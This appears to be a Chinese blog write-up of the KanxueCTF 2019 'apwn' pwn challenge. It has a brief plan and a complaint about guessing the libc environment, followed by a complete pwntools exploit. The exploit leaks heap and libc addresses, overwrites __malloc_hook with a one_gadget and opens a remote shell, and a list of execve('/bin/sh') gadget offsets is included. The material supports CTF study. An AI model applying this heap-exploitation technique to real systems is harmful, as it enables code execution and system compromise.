---
title: Kanxuectf_2019_apwn
date: 2019-04-10 22:54:03
tags:
---
apwn 情境挺有意思的
<!--more-->
# start
题目没啥好说的...任意地址写
有leak
# 思路
leak heap libc & modify malloc_hook..
# 坑点.
做题10min环境5小时
不知是否故意为了增加做出时间不给libc.没给libc结果是2.27的...做的我一脸懵逼...然后我的ubuntu18又和服务器上有点区别我的一开始在init的时候会有一个0x410的tcache所以全靠幻想在做题...

坑死人了..题目半小时左右就做好了结果为了猜环境ubuntu14，16，kali，18全试过..有些机子还没有得docker搞了3,4个小时...



## exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter(">>\n",str(c))
def add_1(name=p64(0x21)*4):
	cmd(1)
	p.sendafter("Name:\n",name)
def add_2(name="YY"):
	cmd(2)
	p.sendafter("Name\n","YY")
	p.sendafter("name\n",name)
def edit_1(idx,name):
	cmd(3)
	p.sendlineafter("which?\n",str(idx))
	p.sendafter("luck.\n",name)
def edit_2(idx,name,pname):
	cmd(4)
	p.sendlineafter("which?\n",str(idx))
	p.sendafter("name?\n",name)
	p.sendafter("name\n",pname)
def free():
	cmd(5)

libc=ELF("./libc-2.27.so")
#libc=ELF("./apwn").libc
#p=process("./apwn")
p=remote("211.159.175.39",8686)

#p=remote("127.0.0.1",1026)
add_1()#0
add_2()
edit_1((0x2e0-0x60)/8,'\x60')
p.readuntil("name: ")
heap=(u64(p.readuntil("1")[:-1].ljust(8,'\x00'))-0X60)#&0xfffffffffffff000
log.warning(hex(heap))

edit_2(0,"YY",p64(0)+p64(0x431))
edit_1((0x2e0-0x60)/8,p64(heap+0x70))

for x in range(60):
	add_1()#1

free()
add_1("\n")

edit_1(60,"AAAAAAAA")


p.readuntil("name: AAAAAAAA")
base=u64(p.readuntil("1")[:-1].ljust(8,'\x00'))-(0x7fce69891090-0x7fce694a5000)
libc.address=base
log.warning(hex(base))




add_2()#1
edit_1((0x2e0-0x60)/8,p64(heap+0xa0))
edit_2(0,"YY",p64(libc.symbols['__malloc_hook']))
one=0x10a38c
edit_2(1,"YY",p64(one+base))

cmd(1)
#now 0
'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:

'''

p.interactive()

#single 0x000000000202060+0x0000555555554000
#lucky 00000000002022E0
```
